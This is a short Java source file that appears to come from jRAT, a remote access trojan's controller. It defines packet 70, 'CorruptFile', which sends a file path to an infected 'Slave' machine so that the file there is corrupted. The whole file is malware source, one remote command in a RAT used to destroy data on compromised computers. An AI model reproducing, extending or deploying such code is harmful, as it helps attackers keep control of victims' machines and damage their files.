package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet70CorruptFile extends AbstractOutgoingPacket {

	private String file;

	public Packet70CorruptFile(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 70;
	}

}
